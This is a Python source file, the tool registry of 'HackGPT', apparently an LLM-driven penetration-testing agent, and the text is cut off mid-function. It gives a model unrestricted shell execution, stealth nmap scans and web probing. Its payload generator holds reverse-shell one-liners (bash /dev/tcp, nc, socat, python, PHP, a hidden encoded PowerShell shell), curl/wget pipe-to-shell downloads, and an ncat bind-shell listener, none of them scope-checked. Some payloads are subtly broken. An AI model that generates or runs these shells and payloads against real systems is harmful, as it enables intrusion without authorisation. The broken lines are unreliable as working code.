"""HackGPT tool registry.

Each tool is an OpenAI function schema plus a handler. Handlers receive the
parsed argument dict and a Ctx, mutate session state, and return a string that
is fed back to the model. Scope-restricted tools call require_scope() first.
"""
from __future__ import annotations

import base64
import codecs
import dataclasses
import ipaddress
import json
import os
import re
import shlex
import socket
import subprocess
import time
import typing as t
import urllib.parse
import urllib.request

from . import config as C
from .report import render_markdown

if t.TYPE_CHECKING:  # pragma: no cover
    from dataclasses import dataclass
    from .ui import Console


class ToolError(RuntimeError):
    pass


def clip(text: str, limit: int = 6000) -> str:
    text = text or ""
    if len(text) <= limit:
        return text
    head = limit * 2 // 3
    tail = limit - head
    return text[:head] + f"\n... [clipped {len(text) - limit} chars] ...\n" + text[-tail:]


def _ts() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S")


@dataclasses.dataclass
class Ctx:
    config: dict
    session: dict
    console: t.Any
    workdir: str
    output_dir: str
    dry_run: bool = False


# --------------------------------------------------------------------------
# shell
# --------------------------------------------------------------------------

def h_shell(args: dict, ctx: Ctx) -> str:
    cmd = str(args.get("command", "")).strip()
    if not cmd:
        raise ToolError("shell: 'command' is required")
    timeout = int(args.get("timeout") or ctx.config.get("timeout_default", 90))

    if ctx.config.get("confirm_shell") and not ctx.console.confirm(f"Run: {cmd}"):
        return "cancelled by operator"
    if ctx.dry_run:
        return f"[dry-run] would run: {cmd}"

    ctx.console.log_action("shell", cmd)
    try:
        proc = subprocess.run(
            cmd, shell=True, cwd=ctx.workdir,
            capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        ctx.session["actions"].append({"tool": "shell", "cmd": cmd, "rc": "timeout", "ts": _ts()})
        return f"$ {cmd}\n[timeout after {timeout}s]"
    except Exception as exc:  # noqa: BLE001
        return f"$ {cmd}\n[error] {exc}"

    out = (proc.stdout or "") + (proc.stderr or "")
    ctx.session["actions"].append(
        {"tool": "shell", "cmd": cmd, "rc": proc.returncode, "ts": _ts(), "bytes": len(out)}
    )
    return clip(f"$ {cmd}\nrc={proc.returncode}\n{out}")


# --------------------------------------------------------------------------
# nmap
# --------------------------------------------------------------------------

NMAP_PROFILES: dict[str, list[str]] = {
    "quick":    ["-T4", "-F", "--open", "--max-retries", "1", "--host-timeout", "5m"],
    "top100":   ["-T4", "--top-ports", "100", "--open", "--max-retries", "1", "--host-timeout", "5m"],
    "full":     ["-T4", "-p-", "--open", "-sV", "--max-retries", "1", "--host-timeout", "15m"],
    "service":  ["-T4", "-sV", "-sC", "--open", "--max-retries", "1", "--host-timeout", "10m"],
    "vuln":     ["-T4", "-sV", "--script=vuln", "--open", "--host-timeout", "15m"],
    "stealth":  ["-T2", "-sS", "-Pn", "-f", "--data-length", "24", "--max-retries", "2", "--host-timeout", "10m"],
    "udp":      ["-sU", "--top-ports", "100", "--open", "--host-timeout", "10m"],
}

_NMAP_PORT = re.compile(r"^(\d+/\w+)\s+open\s+(\S+)(?:\s+(\S+))?", re.MULTILINE)


def h_nmap(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    if not target:
        raise ToolError("nmap_scan: 'target' is required")
    C.require_scope(ctx.config, target)
    profile = str(args.get("profile") or "quick").lower()
    if profile not in NMAP_PROFILES:
        raise ToolError(f"nmap_scan: unknown profile '{profile}' (choose {', '.join(NMAP_PROFILES)})")
    ports = str(args.get("ports", "")).strip()
    extra = str(args.get("extra", "")).strip()
    timeout = int(args.get("timeout") or 900)

    nmap = ctx.config.get("nmap", "nmap")
    cmd = [nmap, *NMAP_PROFILES[profile]]
    if ports:
        cmd += ["-p", ports]
    if extra:
        cmd += shlex.split(extra)
    cmd.append(target)

    pretty = " ".join(cmd)
    if ctx.dry_run:
        return f"[dry-run] would scan: {pretty}"
    ctx.console.log_action("nmap", f"{profile} {target}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except FileNotFoundError:
        raise ToolError("nmap_scan: nmap binary not found") from None
    except subprocess.TimeoutExpired:
        return f"$ {pretty}\n[timeout after {timeout}s]"

    out = (proc.stdout or "") + (proc.stderr or "")
    open_ports = []
    for m in _NMAP_PORT.finditer(out):
        open_ports.append({"port": m.group(1), "service": m.group(2), "version": m.group(3) or ""})
    if open_ports:
        ctx.session["targets"].append(
            {"target": target, "profile": profile, "open_ports": open_ports, "ts": _ts()}
        )
    ctx.session["actions"].append(
        {"tool": "nmap", "target": target, "profile": profile, "ports": len(open_ports), "ts": _ts()}
    )
    summary = "\n".join(f"  {p['port']:>10}  {p['service']:<14} {p['version']}" for p in open_ports[:40])
    body = summary or out.strip()
    return clip(f"$ {pretty}\nrc={proc.returncode}\n--- open ports ---\n{body}\n--- raw tail ---\n{out[-1500:]}")


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------

def _http_client(ctx: Ctx, timeout: float, follow: bool):
    import httpx

    headers = {"User-Agent": ctx.config.get("user_agent", "HackGPT/1.0")}
    return httpx.Client(timeout=timeout, follow_redirects=follow, headers=headers, verify=False)


def h_http_probe(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("http_probe: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    method = str(args.get("method") or "GET").upper()
    follow = bool(args.get("follow", True))
    timeout = float(args.get("timeout") or 20)

    if ctx.dry_run:
        return f"[dry-run] would {method} {url}"

    ctx.console.log_action("http_probe", f"{method} {url}")
    try:
        with _http_client(ctx, timeout, follow) as cli:
            resp = cli.request(method, url)
    except Exception as exc:  # noqa: BLE001
        return f"{method} {url} -> [error] {exc}"

    body = resp.text or ""
    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.IGNORECASE | re.DOTALL)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
    headers = {k: v for k, v in resp.headers.items() if k.lower() in
               ("server", "x-powered-by", "content-type", "content-length",
                "set-cookie", "location", "x-aspnet-version", "via")}
    ctx.session["actions"].append({"tool": "http_probe", "url": url, "status": resp.status_code, "ts": _ts()})
    lines = [
        f"{method} {url} -> {resp.status_code} {resp.reason_phrase} ({len(body)} bytes, {len(resp.headers)} headers)",
        f"title: {title or '-'}",
        "interesting headers:",
    ]
    lines += [f"  {k}: {v[:200]}" for k, v in headers.items()]
    return "\n".join(lines)


def h_web_vuln_scan(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("web_vuln_scan: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    checks = str(args.get("checks") or "headers,methods,paths,cors,tech").lower()
    do = set(x.strip() for x in checks.split(",") if x.strip())
    timeout = float(args.get("timeout") or 20)
    base = "{0.scheme}://{0.netloc}".format(urllib.parse.urlparse(url))

    if ctx.dry_run:
        return f"[dry-run] would run web checks ({checks}) on {url}"

    ctx.console.log_action("web_vuln_scan", url)
    findings: list[str] = []
    try:
        with _http_client(ctx, timeout, True) as cli:
            if "headers" in do or "tech" in do:
                r = cli.get(url)
                hdrs = {k.lower(): v for k, v in r.headers.items()}
                if "tech" in do:
                    tech = [f"{k}={hdrs[k][:120]}" for k in ("server", "x-powered-by", "x-aspnet-version", "via") if k in hdrs]
                    findings.append("tech: " + (", ".join(tech) if tech else "none disclosed"))
                if "headers" in do:
                    missing = [h for h in ("x-content-type-options", "x-frame-options", "content-security-policy",
                                           "strict-transport-security", "referrer-policy", "permissions-policy")
                               if h not in hdrs]
                    if missing:
                        findings.append("missing security headers: " + ", ".join(missing))
                    if "access-control-allow-origin" in hdrs:
                        findings.append(f"CORS header present: ACAO={hdrs['access-control-allow-origin']}")
            if "methods" in do:
                try:
                    o = cli.options(url)
                    allow = o.headers.get("allow", "")
                    findings.append(f"OPTIONS -> {o.status_code} allow={allow or '-'}")
                except Exception as exc:  # noqa: BLE001
                    findings.append(f"OPTIONS failed: {exc}")
            if "cors" in do:
                try:
                    r = cli.get(url, headers={"Origin": "https://evil.example"})
                    acao = r.headers.get("access-control-allow-origin", "")
                    if acao:
                        findings.append(f"reflected Origin -> ACAO={acao} (verify with allowed origins)")
                except Exception as exc:  # noqa: BLE001
                    findings.append(f"CORS probe failed: {exc}")
            if "paths" in do:
                paths = ["/robots.txt", "/.git/config", "/.env", "/admin", "/login", "/swagger/index.html",
                         "/api", "/api/v1", "/server-status", "/phpmyadmin", "/wp-login.php",
                         "/actuator/health", "/.well-known/security.txt"]
                hits = []
                for p in paths:
                    try:
                        pr = cli.get(base + p, timeout=8)
                        if pr.status_code not in (404, 403, 401, 400, 500, 502, 503):
                            hits.append(f"{p} -> {pr.status_code} ({len(pr.content)}b)")
                    except Exception:  # noqa: BLE001
                        continue
                if hits:
                    findings.append("interesting paths:\n  " + "\n  ".join(hits))
    except Exception as exc:  # noqa: BLE001
        return f"web_vuln_scan: {exc}"

    ctx.session["actions"].append({"tool": "web_vuln_scan", "url": url, "ts": _ts()})
    return "\n".join(findings) if findings else "no obvious issues from the selected checks"


# --------------------------------------------------------------------------
# DNS / subdomains
# --------------------------------------------------------------------------

def _run(cmd: list[str], timeout: int = 30) -> str:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as exc:  # noqa: BLE001
        return f"[error] {exc}"


def h_dns_recon(args: dict, ctx: Ctx) -> str:
    domain = str(args.get("domain", "")).strip()
    if not domain:
        raise ToolError("dns_recon: 'domain' is required")
    C.require_scope(ctx.config, domain)
    types = str(args.get("types") or "A,AAAA,CNAME,MX,NS,TXT,SOA")
    ctx.console.log_action("dns_recon", domain)
    out: list[str] = []
    for rtype in [t.strip().upper() for t in types.split(",") if t.strip()]:
        if C.which("dig"):
            res = _run(["dig", "+noall", "+answer", "+time=3", domain, rtype])
        elif C.which("nslookup"):
            res = _run(["nslookup", "-type=" + rtype, domain])
        elif rtype in ("A", "AAAA"):
            try:
                infos = socket.getaddrinfo(domain, None)
                ips = sorted({i[4][0] for i in infos})
                res = "\n".join(f"{domain}. IN {rtype} {ip}" for ip in ips) or "no address"
            except Exception as exc:  # noqa: BLE001
                res = f"[resolver error] {exc}"
        else:
            res = "[no dig/nslookup available — install dnsutils for this record type]"
        res = res.strip()
        if res:
            out.append(f"[{rtype}]\n{res}")
    if C.which("whois"):
        w = _run(["whois", domain], timeout=25).strip()
        if w:
            keep = [ln for ln in w.splitlines()
                    if re.search(r"(registrar|creation|expiry|updated|name server|status|Registrant)", ln, re.I)]
            if keep:
                out.append("[whois]\n" + "\n".join(keep[:20]))
    ctx.session["actions"].append({"tool": "dns_recon", "domain": domain, "ts": _ts()})
    return clip("\n\n".join(out) if out else "no DNS records returned")


def h_subdomain_enum(args: dict, ctx: Ctx) -> str:
    domain = str(args.get("domain", "")).strip()
    if not domain:
        raise ToolError("subdomain_enum: 'domain' is required")
    C.require_scope(ctx.config, domain)
    source = str(args.get("source") or "all").lower()
    ctx.console.log_action("subdomain_enum", domain)
    found: set[str] = set()
    if source in ("all", "crtsh"):
        try:
            url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
            with urllib.request.urlopen(url, timeout=30) as r:
                data = json.loads(r.read().decode("utf-8", "replace"))
            for row in data:
                for name in str(row.get("name_value", "")).splitlines():
                    name = name.strip().lstrip("*.")
                    if name and " " not in name:
                        found.add(name.lower())
        except Exception as exc:  # noqa: BLE001
            found.add(f"[crt.sh error: {exc}]")
    if source in ("all", "hackertarget"):
        res = _run([ctx.config.get("curl", "curl"), "-s",
                    f"https://api.hackertarget.com/hostsearch/?q={urllib.parse.quote(domain)}"], timeout=30)
        for line in res.splitlines():
            if "," in line:
                sub = line.split(",", 1)[0].strip().lower()
                if sub and " " not in sub:
                    found.add(sub)
    subs = sorted(x for x in found if not x.startswith("["))
    errs = [x for x in found if x.startswith("[")]
    if subs:
        ctx.session["targets"].append({"target": domain, "subdomains": subs, "ts": _ts()})
    ctx.session["actions"].append({"tool": "subdomain_enum", "domain": domain, "count": len(subs), "ts": _ts()})
    return clip(f"{len(subs)} subdomains for {domain}:\n" + "\n".join(subs) + ("\n" + "\n".join(errs) if errs else ""))


# --------------------------------------------------------------------------
# CVE / exploit research
# --------------------------------------------------------------------------

def _http_get_json(url: str, timeout: int = 30):
    req = urllib.request.Request(url, headers={"User-Agent": "HackGPT/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def h_cve_lookup(args: dict, ctx: Ctx) -> str:
    q = str(args.get("query", "")).strip()
    if not q:
        raise ToolError("cve_lookup: 'query' is required")
    ctx.console.log_action("cve_lookup", q)
    try:
        if re.match(r"(?i)^cve-\d{4}-\d+$", q):
            data = _http_get_json(f"https://cve.circl.lu/api/cve/{q}")
            lines = [
                f"{data.get('id')}: {data.get('summary', '')[:600]}",
                f"CVSS: {data.get('cvss')}  Published: {data.get('Published')}",
            ]
            refs = data.get("references", []) or []
            if refs:
                lines.append("refs: " + ", ".join(refs[:8]))
            return "\n".join(lines)
        data = _http_get_json(f"https://cve.circl.lu/api/search/{urllib.parse.quote(q)}")
        if isinstance(data, list):
            if not data:
                return f"no CVEs matched '{q}'"
            out = []
            for row in data[:15]:
                out.append(f"{row.get('id')}  cvss={row.get('cvss')}  {str(row.get('summary',''))[:140]}")
            return f"{len(data)} matches for '{q}':\n" + "\n".join(out)
        return json.dumps(data)[:800]
    except Exception as exc:  # noqa: BLE001
        return f"cve_lookup failed: {exc}"


def h_exploit_search(args: dict, ctx: Ctx) -> str:
    q = str(args.get("query", "")).strip()
    if not q:
        raise ToolError("exploit_search: 'query' is required")
    ctx.console.log_action("exploit_search", q)
    out: list[str] = []
    if C.which("searchsploit"):
        res = _run(["searchsploit", "--color", "-w", q], timeout=40)
        if res.strip():
            out.append("[searchsploit]\n" + res.strip()[:3000])
    if not out:
        try:
            data = _http_get_json(f"https://cve.circl.lu/api/search/{urllib.parse.quote(q)}")
            if isinstance(data, list) and data:
                out.append(f"CVEs related to '{q}' (fetch exploits from Exploit-DB / GitHub):\n" +
                           "\n".join(f"{r.get('id')}  {str(r.get('summary',''))[:120]}" for r in data[:10]))
        except Exception:  # noqa: BLE001
            pass
    if not out:
        out.append("no local exploit DB and no CVE matches; install exploitdb (`pkg install exploitdb` if "
                   "available) or search Exploit-DB online. Provide a CVE id for references.")
    return clip("\n\n".join(out))


# --------------------------------------------------------------------------
# payloads
# --------------------------------------------------------------------------

def h_payload_gen(args: dict, ctx: Ctx) -> str:
    ptype = str(args.get("type") or "bash").lower()
    lhost = str(args.get("lhost", "")).strip()
    lport = str(args.get("lport", "")).strip()
    if not lhost or not lport:
        raise ToolError("payload_gen: 'lhost' and 'lport' are required")
    output = str(args.get("output", "")).strip()

    payloads: dict[str, str] = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "nc": f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} >/tmp/f",
        "nc-e": f"nc -e /bin/sh {lhost} {lport}",
        "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr",
        "awk": (f"awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\"; "
                f"while(1){{ printf \"sh\" |& s; while((s |& getline c) > 0) print c |& s; close(s) }}}}'"),
        "python": ("python3 -c 'import socket,subprocess,os;"
                   f"s=socket.socket();s((\"{lhost}\",{lport}));"
                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "python-pty": ("python3 -c 'import socket,pty,os;"
                       f"s=socket.socket();s((\"{lhost}\",{lport}));"
                       "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                       "pty.spawn(\"/bin/sh\")'"),
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": ("powershell -nop -w hidden -enc " +
                       base64.b64encode(
                           ("$c=New-Object Net.Sockets.TcpClient('{h}',{p});$s=$c.GetStream();"
                            "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                            "$r=(iex $d 2>&1 | Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}}"
                            ).replace("{h}", lhost).replace("{p}", lport).encode("utf-16-le")).decode()),
        "download": f"curl -fsSL http://{lhost}/payload.sh | sh",
        "download-wget": f"q=wget -qO- http://{lhost}/payload.sh | sh",
    }
    if ptype not in payloads:
        raise ToolError(f"payload_gen: unknown type '{ptype}' (choose {', '.join(payloads)})")

    payload = payloads[ptype]
    if args.get("base64"):
        payload = base64.b64encode(payload.encode()).decode()
        ptype += "+b64"

    ctx.console.log_action("payload_gen", f"{ptype} {lhost}:{lport}")
    ctx.session["actions"].append({"tool": "payload_gen", "type": ptype, "lhost": lhost, "lport": lport, "ts": _ts()})

    if output:
        path = output if os.path.isabs(output) else os.path.join(ctx.output_dir, output)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n")
        os.chmod(path, 0o700)
        ctx.session["artifacts"].append(path)
        return f"[{ptype}] {lhost}:{lport}\n{payload}\n\nsaved -> {path}"
    return f"[{ptype}] {lhost}:{lport}\n{payload}"


# --------------------------------------------------------------------------
# listener
# --------------------------------------------------------------------------

def h_listener(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "start").lower()
    lport = int(args.get("lport") or 4444)
    proto = str(args.get("proto") or "tcp").lower()
    if action not in ("start", "stop"):
        raise ToolError("listener: action must be start|stop")
    ncat = ctx.config.get("ncat", "ncat")
    if not C.which(ncat):
        raise ToolError("listener: ncat not found")

    running = ctx.session.setdefault("listeners", {})
    if action == "stop":
        rec = running.pop(str(lport), None)
        if rec:
            try:
                os.kill(int(rec["pid"]), 15)
            except ProcessLookupError:
                pass
            return f"stopped listener on {lport} (pid {rec['pid']})"
        return f"no listener recorded on {lport}"

    if str(lport) in running:
        return f"listener already recorded on {lport} (pid {running[str(lport)]['pid']})"
    if ctx.dry_run:
        return f"[dry-run] would start ncat listener on 0.0.0.0:{lport}"
    logpath = os.path.join(ctx.workdir, f"listener-{lport}.log")
    proc = subprocess.Popen(
        [ncat, "-lk", "-p", str(lport), "-e", "/bin/sh"] if proto == "exec" else [ncat, "-lk", "-p", str(lport)],
        stdout=open(logpath, "ab"), stderr=subprocess.STDOUT,
        cwd=ctx.workdir, start_new_session=True,
    )
    running[str(lport)] = {"pid": proc.pid, "proto": proto, "ts": _ts()}
    ctx.console.log_action("listener", f"start {lport}/{proto}")
    return f"ncat listener started on 0.0.0.0:{lport} (pid {proc.pid}, log {logpath})"


# --------------------------------------------------------------------------
# session bookkeeping
# --------------------------------------------------------------------------

def h_note(args: dict, ctx: Ctx) -> str:
    text = str(args.get("text", "")).strip()
    if not text:
        raise ToolError("note: 'text' is required")
    category = str(args.get("category") or "finding").lower()
    entry = {"category": category, "text": text, "ts": _ts()}
    if args.get("evidence"):
        entry["evidence"] = str(args.get("evidence"))[:1000]
    ctx.session.setdefault("findings", []).append(entry)
    if category == "credential" and args.get("host"):
        ctx.session.setdefault("credentials", []).append(
            {"host": str(args.get("host")), "text": text, "ts": entry["ts"]})
    ctx.console.log_action("note", f"[{category}] {text[:80]}")
    return f"recorded ({category}): {text[:120]}"


def h_scope(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "list").lower()
    target = str(args.get("target", "")).strip()
    scope = ctx.config.setdefault("scope", [])
    if action == "list":
        if not scope:
            return "scope is empty. Add authorized targets with: scope add <host|ip|cidr|domain>"
        return "authorized scope:\n" + "\n".join(f"  - {e if isinstance(e,str) else e.get('target')}" for e in scope)
    if action == "add":
        if not target:
            raise ToolError("scope add: 'target' is required")
        if any((e if isinstance(e, str) else e.get("target")) == target for e in scope):
            return f"'{target}' already in scope"
        entry = {"target": target, "added": _ts()}
        if args.get("note"):
            entry["note"] = str(args.get("note"))
        scope.append(entry)
        C.save_config(ctx.config)
        return f"added to scope: {target}"
    if action == "remove":
        if not target:
            raise ToolError("scope remove: 'target' is required")
        before = len(scope)
        ctx.config["scope"] = [e for e in scope
                               if (e if isinstance(e, str) else e.get("target")) != target]
        C.save_config(ctx.config)
        return f"removed {before - len(ctx.config['scope'])} entr(ies) for {target}"
    if action == "check":
        if not target:
            raise ToolError("scope check: 'target' is required")
        return f"{target}: {'IN scope' if C.target_in_scope(target, scope) else 'OUT of scope'}"
    raise ToolError("scope: action must be list|add|remove|check")


def h_file_write(args: dict, ctx: Ctx) -> str:
    path = str(args.get("path", "")).strip()
    content = str(args.get("content", ""))
    if not path:
        raise ToolError("file_write: 'path' is required")
    if not os.path.isabs(path):
        path = os.path.join(ctx.output_dir, path)
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    ctx.session["artifacts"].append(path)
    ctx.console.log_action("file_write", f"{path} ({len(content)}b)")
    return f"wrote {len(content)} bytes -> {path}"


def h_report(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "show").lower()
    path = str(args.get("path", "")).strip()
    if action in ("show",):
        return render_markdown(ctx.session, ctx.config)
    if action in ("save", "export"):
        if not path:
            path = os.path.join(ctx.output_dir, f"report-{ctx.session['name']}.md")
        if not os.path.isabs(path):
            path = os.path.join(ctx.output_dir, path)
        md = render_markdown(ctx.session, ctx.config)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(md)
        ctx.session["artifacts"].append(path)
        return f"report saved -> {path}\n\n{md[:1500]}"
    raise ToolError("report: action must be show|save|export")


# --------------------------------------------------------------------------
# utilities: encoding, hash identification
# --------------------------------------------------------------------------

CODECS = ("base64", "hex", "url", "rot13", "jwt")


def _b64decode(s: str) -> bytes:
    s = s.strip()
    s += "=" * (-len(s) % 4)
    try:
        return base64.b64decode(s, validate=False)
    except Exception:  # noqa: BLE001
        return base64.urlsafe_b64decode(s)


def h_encode(args: dict, ctx: Ctx) -> str:
    data = str(args.get("input", ""))
    op = str(args.get("op") or "encode").lower()
    codec = str(args.get("codec") or "base64").lower()
    if op not in ("encode", "decode"):
        raise ToolError("encode: op must be encode|decode")
    if codec not in CODECS:
        raise ToolError(f"encode: unknown codec '{codec}' (choose {', '.join(CODECS)})")
    ctx.console.log_action("encode", f"{codec}/{op}")
    ctx.session["actions"].append({"tool": "encode", "codec": codec, "op": op, "ts": _ts()})

    if codec == "jwt":
        if op == "encode":
            raise ToolError("encode: jwt supports decode only (header/payload, no signature verification)")
        parts = data.strip().split(".")
        if len(parts) != 3:
            raise ToolError("encode: not a JWT — expected 3 dot-separated segments")

        def _d(seg: str) -> str:
            seg += "=" * (-len(seg) % 4)
            return base64.urlsafe_b64decode(seg.encode("utf-8")).decode("utf-8", "replace")

        return f"header: {_d(parts[0])}\npayload: {_d(parts[1])}\nsignature: {parts[2][:48]}..."

    if codec == "base64":
        if op == "encode":
            return base64.b64encode(data.encode("utf-8")).decode("ascii")
        try:
            return _b64decode(data).decode("utf-8", "replace")
        except Exception as exc:  # noqa: BLE001
            raise ToolError(f"encode: base64 decode failed: {exc}") from exc

    if codec == "hex":
        if op == "encode":
            return data.encode("utf-8").hex()
        try:
            return bytes.fromhex("".join(data.split())).decode("utf-8", "replace")
        except Exception as exc:  # noqa: BLE001
            raise ToolError(f"encode: hex decode failed: {exc}") from exc

    if codec == "url":
        if op == "encode":
            return urllib.parse.quote(data, safe="")
        return urllib.parse.unquote_plus(data)

    return codecs.encode(data, "rot_13")  # rot13 is symmetric


_HASH_PATTERNS: list[tuple[str, list[str]]] = [
    (r"^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$", ["bcrypt"]),
    (r"^\$argon2(id|i|d)\$", ["argon2"]),
    (r"^\$6\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{86}$", ["sha512crypt (Linux)"]),
    (r"^\$5\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{43}$", ["sha256crypt (Linux)"]),
    (r"^\$1\$[./A-Za-z0-9]{0,16}\$[./A-Za-z0-9]{22}$", ["md5crypt (Linux)"]),
    (r"^\$P\$[./A-Za-z0-9]{31}$", ["phpass (WordPress)"]),
    (r"^\$H\$[./A-Za-z0-9]{31}$", ["phpass (phpBB)"]),
    (r"^\*[0-9a-fA-F]{40}$", ["MySQL 4.x/5 (SHA1 x2)"]),
    (r"^[0-9a-fA-F]{16}$", ["MySQL 3.x / DES-crypt"]),
    (r"^[0-9a-fA-F]{32}$", ["MD5", "NTLM", "MD4"]),
    (r"^[0-9a-fA-F]{40}$", ["SHA1", "RIPEMD-160"]),
    (r"^[0-9a-fA-F]{56}$", ["SHA224"]),
    (r"^[0-9a-fA-F]{64}$", ["SHA256", "SHA3-256", "BLAKE2s"]),
    (r"^[0-9a-fA-F]{96}$", ["SHA384"]),
    (r"^[0-9a-fA-F]{128}$", ["SHA512", "SHA3-512", "BLAKE2b"]),
]


def h_hash_info(args: dict, ctx: Ctx) -> str:
    h = str(args.get("hash", "")).strip()
    if not h:
        raise ToolError("hash_info: 'hash' is required")
    hits: list[str] = []
    for pat, names in _HASH_PATTERNS:
        if re.search(pat, h):
            hits.extend(names)
    ctx.session["actions"].append({"tool": "hash_info", "hash": h[:64], "ts": _ts()})
    if not hits:
        return f"no known format matched (len={len(h)}); not enough structure to identify"
    return f"length={len(h)}  possible: " + ", ".join(dict.fromkeys(hits))


# --------------------------------------------------------------------------
# utilities: IP intel, TLS, directory probing
# --------------------------------------------------------------------------

def h_ip_info(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    if not target:
        raise ToolError("ip_info: 'target' is required")
    host = C.normalize_target(target)
    label = target
    try:
        net = ipaddress.ip_network(target, strict=False)
    except ValueError:
        net = None
    if net is not None:
        host = str(net.network_address)
        label = f"{target} -> network {host}/{net.prefixlen}"
    C.require_scope(ctx.config, host)
    ctx.console.log_action("ip_info", label)
    if ctx.dry_run:
        return f"[dry-run] would look up {label}"
    try:
        data = _http_get_json(f"https://ipinfo.io/{urllib.parse.quote(host)}/json", timeout=20)
    except Exception as exc:  # noqa: BLE001
        return f"ip_info failed for {label}: {exc}"
    keep = {k: data.get(k) for k in ("ip", "hostname", "city", "region", "country", "loc",
                                     "org", "asn", "company", "timezone", "anycast", "postal")}
    keep = {k: v for k, v in keep.items() if v not in (None, "")}
    ctx.session["actions"].append({"tool": "ip_info", "target": label, "ts": _ts()})
    return clip(f"ip_info {label}:\n" + json.dumps(keep, indent=2))


def h_tls_cert(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    port = int(args.get("port") or 443)
    timeout = int(args.get("timeout") or 20)
    if not target:
        raise ToolError("tls_cert: 'target' is required")
    host = C.normalize_target(target)
    C.require_scope(ctx.config, host)
    openssl = C.which("openssl")
    if not openssl:
        raise ToolError("tls_cert: openssl not found")
    ctx.console.log_action("tls_cert", f"{host}:{port}")
    if ctx.dry_run:
        return f"[dry-run] would fetch the TLS certificate for {host}:{port}"
    try:
        p1 = subprocess.run(
            [openssl, "s_client", "-connect", f"{host}:{port}", "-servername", host],
            input=b"", capture_output=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"tls_cert: connection to {host}:{port} timed out"
    p2 = subprocess.run(
        [openssl, "x509", "-noout", "-subject", "-issuer", "-dates",
         "-fingerprint", "-serial", "-nameopt", "sep_multiline"],
        input=p1.stdout, capture_output=True, timeout=20,
    )
    out = (p2.stdout or b"").decode("utf-8", "replace") + (p2.stderr or b"").decode("utf-8", "replace")
    ctx.session["actions"].append({"tool": "tls_cert", "target": f"{host}:{port}", "ts": _ts()})
    return clip(f"TLS certificate {host}:{port}\n{out.strip() or 'no certificate parsed'}")


DEFAULT_DIRS: list[str] = [
    "/robots.txt", "/.git/", "/.git/config", "/.env", "/.htaccess", "/.svn/entries",
    "/admin", "/administrator", "/backup", "/backup.zip", "/config.php", "/db.sql",
    "/debug", "/login", "/logout", "/phpinfo.php", "/phpmyadmin", "/server-status",
    "/sitemap.xml", "/sql", "/test", "/upload", "/uploads", "/wp-admin", "/wp-login.php",
    "/wp-content", "/api", "/api/v1", "/api/v1/users", "/swagger/index.html", "/actuator",
    "/actuator/health", "/.well-known/security.txt", "/crossdomain.xml", "/cgi-bin/",
    "/includes", "/install", "/jenkins", "/kibana", "/solr", "/graphql", "/metrics",
]


def h_web_dirs(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("web_dirs: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    wordlist = str(args.get("wordlist", "")).strip()
    limit = int(args.get("limit") or 60)
    timeout = float(args.get("timeout") or 8)

    paths = list(DEFAULT_DIRS)
    if wordlist:
        wp = wordlist if os.path.isabs(wordlist) else os.path.join(ctx.workdir, wordlist)
        try:
            with open(wp, "r", encoding="utf-8", errors="replace") as fh:
                paths = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
        except OSError as exc:
            raise ToolError(f"web_dirs: cannot read wordlist {wp}: {exc}") from exc
    paths = paths[:limit]

    base = "{0.scheme}://{0.netloc}".format(urllib.parse.urlparse(url))
    ctx.console.log_action("web_dirs", f"{base} ({len(paths)} paths)")
    if ctx.dry_run:
        return f"[dry-run] would probe {len(paths)} paths under {base}"

    hits: list[str] = []
    try:
        with _http_client(ctx, timeout, False) as cli:
            for p in paths:
